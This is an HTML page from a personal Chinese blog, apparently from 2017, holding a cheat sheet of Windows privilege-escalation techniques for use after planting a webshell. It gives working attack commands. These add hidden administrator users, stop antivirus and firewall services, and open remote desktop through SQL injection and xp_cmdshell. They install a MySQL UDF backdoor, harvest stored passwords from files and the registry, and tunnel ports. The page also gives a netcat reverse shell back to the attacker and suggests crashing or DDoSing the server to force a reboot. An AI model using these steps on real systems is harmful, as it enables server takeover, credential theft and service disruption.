@@ -1,0 +1,688 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="Mark" />
+
+
+
+<meta name="description" content="提权：在我们拿到一个webshell之后，我们需要得到服务器的权限，从webshell权限到服务器的权限是一种提权。&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;而当我们是一个普通用户的时候，提升到服务器的超级用户的过程，这也是一种提权。&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;一般我们都是使用">
+<meta name="keywords">
+<meta property="og:type" content="article">
+<meta property="og:title" content="提权技巧">
+<meta property="og:url" content="http://yoursite.com/2017/04/26/提权/index.html">
+<meta property="og:site_name" content="大佬要我改个名">
+<meta property="og:description" content="提权：在我们拿到一个webshell之后，我们需要得到服务器的权限，从webshell权限到服务器的权限是一种提权。&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;而当我们是一个普通用户的时候，提升到服务器的超级用户的过程，这也是一种提权。&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;一般我们都是使用">
+<meta property="og:updated_time" content="2017-04-26T00:57:12.530Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="提权技巧">
+<meta name="twitter:description" content="提权：在我们拿到一个webshell之后，我们需要得到服务器的权限，从webshell权限到服务器的权限是一种提权。&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;而当我们是一个普通用户的时候，提升到服务器的超级用户的过程，这也是一种提权。&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;一般我们都是使用">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="大佬要我改个名" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/img/TiddlyWiki.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/black/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>提权技巧 | 大佬要我改个名</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/0.jpg" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">Mark</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">今年的目标是先泡个女朋友</p>
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:1172136081@qq.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" href="https://github.com/github" title="GitHub"></a>
+                            
+                                <a class="fa 知乎" href="#" title="知乎"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web安全/">Web安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/上传文件/">上传文件</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/信息收集/">信息收集</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/文件解析/">文件解析</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://hexo.io">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://moxfive.xyz/">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">专注于前端</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Mark</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/0.jpg" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">Mark</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">今年的目标是先泡个女朋友</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:1172136081@qq.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="https://github.com/github" title="GitHub"></a>
+                            
+                                <a class="fa 知乎" target="_blank" href="#" title="知乎"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-提权" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2017/04/26/提权/" class="article-date">
+      <time datetime="2017-04-26T00:52:55.977Z" itemprop="datePublished">2017-04-26</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      提权技巧
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>提权：在我们拿到一个webshell之后，我们需要得到服务器的权限，从webshell权限到服务器的权限是一种提权。<br>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;而当我们是一个普通用户的时候，提升到服务器的超级用户的过程，这也是一种提权。<br>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一般我们都是使用菜刀的功能(虚拟终端)提权<br><a id="more"></a></p>
+<hr>
+<p>1.cmd拒绝访问就自己上传一个cmd.exe，自己上传的cmd是不限制后缀的，还可以是cmd.com cmd.txt cmd.rar</p>
+<p>2.net user不能执行有时候是net.exe被删除了，可以先试试net1，不行就自己上传一个net.exe</p>
+<p>3.cmd执行exp没回显的解决方法：com路径那里输入exp路径C:\RECYCLER\pr.exe，命令那里清空(包括/c )输入”net user key daxia /add”</p>
+<p>4.有时候因为监控而添加用户失败，试试上传“PwDump7 破解当前管理密码(hash值)”俩个都上传，执行PwDump7.exe就可以了，之后解密哈希值得到铭文，建</p>
+<p>议重定向结果到保存为1.txt /c c:\windows\temp\cookies\PwDump7.exe &gt;1.txt</p>
+<p>5.有时候权限很松，很多命令都可以执行，但是就是增加不上用户，这时候你就要考虑是不是因为密码过于简单或是过于复杂了</p>
+<p>6.用wt.asp扫出来的目录，其中红色的文件可以替换成exp，执行命令时cmd那里输入替换的文件路径，下面清空双引号加增加用户的命令</p>
+<p>7.有时候可以添加用户，但是添加不到管理组，有可能是administrators改名了，net user administrator 看下本地组成员，*administrators</p>
+<p>8.有的cmd执行很变态，asp马里，cmd路径填上面，下面填：””c:\xxx\exp.exe “whoami”  记得前面加两个双引号，不行后面也两个，不行就把exp的路径放在</p>
+<p>cmd那里，下面不变</p>
+<p>9.当添加不上用户却可以添加“增加用户的Vbs、bat）的时候，就添加一个吧，然后用“直接使服务器蓝屏重启的东东”让服务器重启就提权成功</p>
+<p>10.菜刀执行的技巧，上传cmd到可执行目录，右击cmd 虚拟终端，help 然后setp c:\windows\temp\cmd.exe 设置终端路径为：c:\windows\temp\cmd.exe</p>
+<p>11.支持aspx但跨不了目录的时候，可以上传一个读iis的vbs，执行命令列出所有网站目录，找到主站的目录就可以跨过去了，上传cscript.exe到可执行目录，</p>
+<p>接着上传iispwd.vbs到网站根目录，cmd命令/c “c:\windows\temp\cookies\cscript.exe” d:\web\iispwd.vbs</p>
+<p>11.如何辨别服务器是不是内网？192.168.x.x  172.16.x.x  10.x.x.x</p>
+<p>12.安全狗下加用户的语句：：for /l %i in (1,1,1000) do @net user test test /add&amp;@net localgroup administrators test /add</p>
+<p>13.21对应的FTP、1433对应的MSSQL、3306对应的MYSQL、3389对应的远程桌面、1521对应的Oracle、5631对应的pcanywhere</p>
+<p>14.劫持提权，说到这个，想必肯定会想到lpk.dll这类工具，有时候在蛋疼怎么都加不上账户的时候，可以试试劫持shift、添加开机启动等等思路</p>
+<p>15.提权成功但3389端口没开，执行语句或是工具开3389失败的时候，可以上传rootkit.asp，登陆进去就是system权限，这时候再尝试开3389希望较大</p>
+<h2 id="常用DOS命令"><a href="#常用DOS命令" class="headerlink" title="常用DOS命令"></a>常用DOS命令</h2><p>查看版本：ver</p>
+<p>查看权限：whoami</p>
+<p>查看配置：systeminfo</p>
+<p>查看用户：net user</p>
+<p>查看进程：tasklist</p>
+<p>查看正在运行的服务：tasklist /svc</p>
+<p>查看开放的所有端口：netstat -ano</p>
+<p>查询管理用户名：query user</p>
+<p>查看搭建环境：ftp 127.0.0.1</p>
+<p>查看指定服务的路径：sc qc Mysql</p>
+<p>添加一个用户：net user key key001 /add</p>
+<p>提升到管理权限：net localgroup administrators key /add</p>
+<p>添加用户并提升权限：net user key key001 /add &amp; net localgroup administrators key /add</p>
+<p>查看制定用户信息：net user key</p>
+<p>查看所有管理权限的用户：net localgroup administrators</p>
+<p>加入远程桌面用户组：net localgroup “Remote Desktop Users” key /add</p>
+<p>突破最大连接数：mstsc /admin /v:127.0.0.1</p>
+<p>删除用户：net user key /del</p>
+<p>删除管理员账户:net user administrator key001</p>
+<p>更改系统登陆密码：net password key001</p>
+<p>激活GUEST用户：net user guest /active:yes</p>
+<p>开启TELNET服务：net start telnet</p>
+<p>关闭麦咖啡：net stop “McAfee McShield”</p>
+<p>关闭防火墙：net stop sharedaccess</p>
+<p>查看当前目录的所有文件：dir c:\windows\</p>
+<p>查看制定文件的内容：type c:\windows\1.asp</p>
+<p>把cmd.exe复制到c:\windows的temp目录下并命名为cmd.txt：copy c:\windows\temp\cookies\cmd.exe c:\windows\temp\cmd.txt</p>
+<p>开3389端口的命令：REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</p>
+<p>查看补丁：dir c:\windows>a.txt&amp;(for %i in (KB952004.log KB956572.log KB2393802.log KB2503665.log KB2592799.log KB2621440.log</p>
+<p>KB2160329.log KB970483.log KB2124261.log KB977165.log KB958644.log) do @type a.txt|@find /i “%i”||@echo%i Not Installed!)&amp;del /f /q</p>
+<p>/a a.txt</p>
+<h2 id="常见杀软"><a href="#常见杀软" class="headerlink" title="常见杀软"></a>常见杀软</h2><p>360tray.exe        360实时保护<br>ZhuDongFangYu.exe  360主动防御<br>KSafeTray.exe        金山卫士<br>McAfee McShield.exe  麦咖啡<br>SafeDogUpdateCenter.exe  服务器安全狗</p>
+<h2 id="windows提权中敏感目录和敏感注册表的利用"><a href="#windows提权中敏感目录和敏感注册表的利用" class="headerlink" title="windows提权中敏感目录和敏感注册表的利用"></a>windows提权中敏感目录和敏感注册表的利用</h2><p>敏感目录               目录权限           提权用途</p>
+<p>C:\Program Files\                                          默认用户组users对该目录拥有查看权        可以查看服务器安装的应用软件<br>C:\Documents and Settings\All Users\「开始」菜单\程序       Everyone拥有查看权限          存放快捷方式，可以下载文件，属性查看安装路径<br>C:\Documents and Settings\All Users\Documents              Everyone完全控制权限                    上传执行cmd及exp<br>C:\windows\system32\inetsrv\                               Everyone完全控制权限                    上传执行cmd及exp<br>C:\windows\my.iniC:\Program Files\MySQL\MySQL Server 5.0\my.ini  默认用户组users拥有查看权限        安装mysql时会将root密码写入该文件<br>C:\windows\system32\                                       默认用户组users拥有查看权限   Shift后门一般在该文件夹，可以下载后门破解密码<br>C:\Documents and Settings\All Users\「开始」菜单\程序\启动  Everyone拥有查看权限         可以尝试向该目录写入vbs或bat，服务器重启后运行<br>C:\RECYCLER\D:\RECYCLER\                                   Everyone完全控制权限                     回收站目录。常用于执行cmd及exp<br>C:\Program Files\Microsoft SQL Server\                     默认用户组users对该目录拥有查看权限       有时候该目录也存在可执行权限<br>C:\Program Files\MySQL\                                    默认用户组users对该目录拥有查看权限       找到MYSQL目录中user.MYD里的root<br>C:\oraclexe\                                               默认用户组users对该目录拥有查看权限       可以尝试利用Oracle的默认账户提权<br>C:\WINDOWS\system32\config                                 默认用户组users对该目录拥有查看权限       尝试下载sam文件进行破解提权<br>C:\Program Files\Geme6 FTP Server\Remote Admin\Remote.ini  默认用户组users对该目录拥有查看权限       Remote.ini文件中存放着G6FTP的密码<br>c:\Program Files\RhinoSoft.com\Serv-U\c:\Program Files\Serv-U\  默认用户组users对该目录拥有查看权限  ServUDaemon.ini 中存储了虚拟主机网站路径和密码<br>c:\windows\system32\inetsrv\MetaBase.xml                   默认用户组users对该目录拥有查看权限       IIS配置文件 C:tomcat5.0\conf\resin.conf                                默认用户组users对该目录拥有查看权限       Tomat存放密码的位置<br>C:\ZKEYS\Setup.ini                                         默认用户组users对该目录拥有查看权限       ZKEYS虚拟主机存放密码的位置</p>
+<h2 id="提权中的敏感注册表位置"><a href="#提权中的敏感注册表位置" class="headerlink" title="提权中的敏感注册表位置"></a>提权中的敏感注册表位置</h2><p>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\MSSQLServer\MSSQLServer\SuperSocketNetLib\Tcp             Mssql端口 </p>
+<p>HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server DenyTSConnections                         远程终端 值为0 即为开启 </p>
+<p>HKEY_LOCAL_MACHINE\SOFTWARE\MySQL AB\                                                           mssql的注册表位置 </p>
+<p>HKEY_LOCAL_MACHINE\SOFTWARE\HZHOST\CONFIG\                                                      华众主机注册表配置位置 </p>
+<p>HKEY_LOCAL_MACHINE\SOFTWARE\Cat Soft\Serv-U\Domains\1\UserList\                                 serv-u的用户及密码（su加密）位置</p>
+<p>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\TerminalServer\ WinStations\RDP-Tcp    在该注册表位置PortNumber的值即位3389端口值 </p>
+<p>HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\Servers                               mysql管理工具Navicat的注册表位置，提权运用请谷歌 </p>
+<p>HKEY_LOCAL_MACHINE\SYSTEM\RAdmin\v2.0\Server\Parameters                              Radmin的配置文件，提权中常将其导出进行进行覆盖提权 </p>
+<p>HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Services\MSFtpsvc\Parameters\Virtual Roots\      IIS注册表全版本泄漏用户路径和FTP用户名漏洞 </p>
+<p>HKEY_LOCAL_MACHINE\software\hzhost\config\Settings\mastersvrpass                           华众主机在注册表中保存的mssql、mysql等密码 </p>
+<p>HKEY_LOCAL_MACHINE\SYSTEM\LIWEIWENSOFT\INSTALLFREEADMIN\11                                    星外主机mssql的sa账号密码，双MD5加密 </p>
+<p>HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Services\MSFtpsvc\Parameters\Virtual Roots\ControlSet002  星外ftp的注册表位置，当然也包括ControlSet001、ControlSet003。</p>
+<h2 id="SQL语句直接开启3389"><a href="#SQL语句直接开启3389" class="headerlink" title="SQL语句直接开启3389"></a>SQL语句直接开启3389</h2><p>3389登陆关键注册表位置：HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\TerminalServer\DenyTSConnections</p>
+<p>其中键值DenyTSConnections 直接控制着3389的开启和关闭，当该键值为0表示3389开启，1则表示关闭。</p>
+<p>而MSSQL的xp_regwrite的存储过程可以对注册进行修改，我们使用这点就可以简单的修改DenyTSConnections键值，从而控制3389的关闭和开启。</p>
+<p>开启3389的SQL语句： syue.com/xiaohua.asp?id=100;exec master.dbo.xp_regwrite’HKEY_LOCAL_MACHINE’,’SYSTEM\CurrentControlSet\Control\Terminal</p>
+<p>Server’,’fDenyTSConnections’,’REG_DWORD’,0;–</p>
+<p>关闭3389的SQL语句： syue.com/xiaohua.asp?id=100;exec master.dbo.xp_regwrite’HKEY_LOCAL_MACHINE’,’SYSTEM\CurrentControlSet\Control\Terminal</p>
+<p>Server’,’fDenyTSConnections’,’REG_DWORD’,1;–</p>
+<p>2003可以实现一句话开3389： reg add “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp” /v PortNumber /t REG_DWORD /d 80 /f</p>
+<h2 id="wscript-shell的删除和恢复"><a href="#wscript-shell的删除和恢复" class="headerlink" title="wscript.shell的删除和恢复"></a>wscript.shell的删除和恢复</h2><p>卸载wscript.shell对象，在cmd下或直接运行：regsvr32 /u %windir%\system32\WSHom.Ocx<br>卸载FSO对象，在cmd下或直接运行：regsvr32.exe /u %windir%\system32\scrrun.dll<br>卸载stream对象，在cmd下或直接运行：regsvr32 /s /u “C:\ProgramFiles\CommonFiles\System\ado\msado15.dll”   如果想恢复的话只需要去掉/U 即可重新再注册以上相关ASP组件，这样子就可以用了</p>
+<h2 id="如何找到准确的终端连接端口？"><a href="#如何找到准确的终端连接端口？" class="headerlink" title="如何找到准确的终端连接端口？"></a>如何找到准确的终端连接端口？</h2><p>在aspx大马里，点击“系统信息”第三个就是目前的3389端口或是执行命令查看正在运行的服务：tasklist /svc<br>找到：svchost.exe         1688  TermService<br>记住1688这个ID值，查看开放的所有端口：netstat -ano<br>找到1688这个ID值所对应的端口就是3389目前的端口</p>
+<h2 id="iis6提权提示Can-not-find-wmiprvse-exe的突破方法"><a href="#iis6提权提示Can-not-find-wmiprvse-exe的突破方法" class="headerlink" title="iis6提权提示Can not find wmiprvse.exe的突破方法"></a>iis6提权提示Can not find wmiprvse.exe的突破方法</h2><p>突破方法一：<br>在IIS环境下，如果权限做得不严格，我们在aspx大马里面是有权限直接结束wmiprvse.exe进程的，进程查看里面直接K掉</p>
+<p>在结束之后，它会再次运行，这时候的PID值的不一样的，这时候我们回来去运行exp，直接秒杀。</p>
+<p>突破方法二：<br>虚拟主机，一般权限严格限制的，是没权限结束的，这时候我们可以考虑配合其他溢出工具让服务器强制重启，比如“直接使服务器蓝屏重启的东东”</p>
+<p>甚至可以暴力点，DDOS秒杀之，管理发现服务器不通了首先肯定是以为服务器死机，等他重启下服务器（哪怕是IIS重启下）同样秒杀之。</p>
+<h2 id="本地溢出提权"><a href="#本地溢出提权" class="headerlink" title="本地溢出提权"></a>本地溢出提权</h2><p>计算机有个地方叫缓存区,程序的缓存区长度是被事先设定好的,如果用户输入的数据超过了这个缓存区的长度,那么这个程序就会溢出了.</p>
+<p>缓存区溢出漏洞主要是由于许多软件没有对缓存区检查而造成的.</p>
+<p>利用一些现成的造成溢出漏洞的exploit通过运行,把用户从users组或其它系统用户中提升到administrators组.</p>
+<p>想要执行cmd命令，就要wscript.shell组建支持，或是支持aspx脚本也行，因为aspx脚本能调用.net组件来执行cmd的命令.</p>
+<h2 id="Mssql提权"><a href="#Mssql提权" class="headerlink" title="Mssql提权"></a>Mssql提权</h2><p>扫描开放的端口，1433开了就可以找sa密码提权，用大马里的搜索文件功能，sa密码一般在conn.asp config.asp web.config 这三个文件</p>
+<p>也可以通过注册表找配置文件，看下支持aspx不，支持的话跨目录到别的站点上找，找到之后用aspshell自带的sql提权登录再执行命令创建用户即可。</p>
+<p>aspx马提权执行命令有点不一样，点击数据库管理–选MSSQL–server=localhost;UID=sa;PWD=;database=master;Provider=SQLOLEDB–输入帐号密码连接即</p>
+<p>可</p>
+<p>增加一个用户：exec master.dbo.xp_cmdshell ‘net user key key001 /add’;– 提升为管理员：exec master.dbo.xp_cmdshell ‘net localgroup administrators key /add’;–</p>
+<p>PS:如果增加不上，说明是xp_cmdshell组建没有，增加xp_cmdshell组建命令：Use master dbcc addextendedproc(‘xp_cmdshell’,’xplog70.dll’)</p>
+<p>1433一句话开3389： Exec master.dbo.xp_regwrite’HKEY_LOCAL_MACHINE’,’SYSTEM\CurrentControlSet\Control\Terminal</p>
+<p>Server’,’fDenyTSConnections’,’REG_DWORD’,0;–</p>
+<h2 id="mysql提权"><a href="#mysql提权" class="headerlink" title="mysql提权"></a>mysql提权</h2><p>利用mysql提权的前提就是,服务器安装了mysql，mysql的服务没有降权，是默认安装以系统权限继承的(system权限).并且获得了root的账号密码</p>
+<p>如何判断一台windows服务器上的mysql有没有降权？ cmd命令net user 如果存在 mysql mssql这样用户或者类似的.通常就是它的mssql mysql服务已经被降权运行了</p>
+<p>如何判断服务器上是否开启了mysql服务？ 开了3306端口，有的管理员会把默认端口改掉.另一个判断方法就是网站是否支持php,一般支持的话都是用mysql数据库的.</p>
+<p>如何查看root密码？ 在mysql的安装目录下找到user.myd这个文件，连接信息就在里面，一般是40位cmd加密，一些php网站安装的时候用的是root用户，在conn.asp config.asp这</p>
+<p>些文件里，可以用PHP脚本的文件搜索功能搜索这两个文件，找到之后编辑就可以找到连接信息，有时会显得很乱，这时就需要自己去组合，前17位在第一行可以</p>
+<p>找到，还有23位在第三行或是其他行，自己继续找。</p>
+<p>可以直接用php脚本里“mysql执行”，或是上传个UDF.php，如果网站不支持PHP，可以去旁一个php的站，也可以把UDF.php上传到别的phpshell上也可以。</p>
+<p>填入帐号密码之后，自然就是安装DLL了，点击“自动安装Mysql BackDoor” 显示导出跟创建函数成功后，紧接着执行增加用户的命令即可。</p>
+<p>PS：5.0版本以下(包括5.0的)默认c:\windows\系统目录就可以了，5.1版本以上的不能导出到系统目录下创建自定义函数，只能导出在mysql安装目录下的</p>
+<p>lib/plugin目录中，例如：D:/Program Files/MySQL/MySQL Server 5.1/lib/plugin/mysql.dll</p>
+<h2 id="serv-u提权"><a href="#serv-u提权" class="headerlink" title="serv-u提权"></a>serv-u提权</h2><p>这个文件里包含serv-u的md5密码：C:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini</p>
+<p>找到这个文件：ServUDaemon.ini 打开找到：LocalSetupPassword=nqFCE64E0056362E8FCAF813094EC39BC2</p>
+<p>再拿md5密文去解密，再用现在的密码登陆提权即可。</p>
+<p>serv-u提权的前提是43958端口开了，且知道帐号密码！</p>
+<p>如果帐号密码默认，直接用shell里面的serv-u提权功能即可搞定，建议用aspx马、php马去提权，因为可以看回显。</p>
+<p>530说明密码不是默认的,回显330说明成功，900说明密码是默认的</p>
+<p>在程序里找个快捷方式，或是相关的文件进行下载到本地，再查看文件的属性，就可以找到serv-u的安装目录了。</p>
+<h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><p>什么情况下适合转发端口？</p>
+<p>1.服务器是内网，我们无法连接。 2.服务器上有防火墙，阻断我们的连接。</p>
+<p>转发端口的前提，我们是外网或是有外网服务器。</p>
+<p>找个可读可写目录上传lcx.exe</p>
+<p>本地cmd命令：lcx.exe -listen 1988 4567  （监听本地1988端口并转发到4567端口）</p>
+<p>接着shell命令：/c c:\windows\temp\cookies\lcx.exe -slave 本机ip 1988 服务器ip 3389  （把服务器3389端口转发到本地4567端口）</p>
+<p>之后本地连接：127.0.0.1:4567  (如果不想加上:4567的话，本地执行命令的时候，把4567换成3389来执行就行了)</p>
+<p>以上是本机外网情况下操作，接着说下在外网服务器里如何操作：</p>
+<p>上传lxc.exe cmd.exe到服务器且同一目录，执行cmd.exe命令：lcx.exe -listen 1988 4567</p>
+<p>接着在aspx shell里点击端口映射，远程ip改为站点的ip，远端口程填1988，点击映射端口，接着在服务器里连接127.0.0.1:4567就可以了。</p>
+<h2 id="NC反弹提权"><a href="#NC反弹提权" class="headerlink" title="NC反弹提权"></a>NC反弹提权</h2><p>当可以执行net user，但是不能建立用户时，就可以用NC反弹提权试下，特别是内网服务器，最好用NC反弹提权。</p>
+<p>不过这种方法, 只要对方装了防火墙, 或是屏蔽掉了除常用的那几个端口外的所有端口，那么这种方法也失效了….</p>
+<p>找个可读可写目录上传nc.exe cmd.exe</p>
+<p>-l  监听本地入栈信息</p>
+<p>-p  port打开本地端口</p>
+<p>-t  以telnet形式应答入栈请求</p>
+<p>-e  程序重定向</p>
+<p>本地cmd执行：nc -vv -l -p 52 进行反弹</p>
+<p>接着在shell里执行命令：c:\windows\temp\nc.exe -vv 服务器ip 999 -e c:\windows\temp\cmd.exe 最好是80或8080这样的端口，被防火墙拦截的几率小</p>
+<p>很多</p>
+<p>执行成功后本地cmd命令：cd/  （只是习惯而已）</p>
+<p>接着以telnet命令连接服务器：telnet 服务器ip 999</p>
+<p>回车出现已选定服务器的ip就说明成功了，接着权限比较大了，尝试建立用户！</p>
+<p>PS：一般这样的格式执行成功率很小，不如直接在cmd那里输入：c:\windows\temp\nc.exe 命令这里输入：-vv 服务器ip 999 -e c:\windows\temp\cmd.exe</p>
+<p>这个技巧成功率比上面那个大多了，不单单是nc可以这样，pr这些提权exp也是可以的</p>
+<h2 id="星外提权"><a href="#星外提权" class="headerlink" title="星外提权"></a>星外提权</h2><p>如何知道是不是星外主机？</p>
+<p>第一：网站物理路径存在“freehost” 第二：asp马里点击程序，存在“7i24虚拟主机管理平台”“星外主机”之类的文件夹</p>
+<p>默认帐号：freehostrunat 默认密码：fa41328538d7be36e83ae91a78a1b16f!7</p>
+<p>freehostrunat这个用户是安装星外时自动建立的，已属于administrators管理组，而且密码不需要解密，直接登录服务器即可</p>
+<p>（ee.exe提权法）</p>
+<p>找个可读可写目录上传ee.exe</p>
+<p>cmd命令：/c c:\windows\temp\cookies\ee.exe -i  （获取星外帐号的id值，例如回显：FreeHost ID：724）</p>
+<p>接着命令：/c c:\windows\temp\cookies\ee.exe -u 724  （获取星外的帐号密码）</p>
+<p>（vbs提权法）</p>
+<p>找个可读可写目录上传cscript.exe和iispwd.vbs</p>
+<p>cmd执行：/c “c:\windows\temp\cookies\cscript.exe” c:\windows\temp\cookies\iispwd.vbs</p>
+<p>意思是读取iis，这样一来，不但可以获取星外的帐号密码，还可以看到同服务器上的所有站点的目录</p>
+<h2 id="360提权"><a href="#360提权" class="headerlink" title="360提权"></a>360提权</h2><p>找个可读可写目录上传360.exe</p>
+<p>cmd命令：/c c:\windows\temp\cookies\360.exe</p>
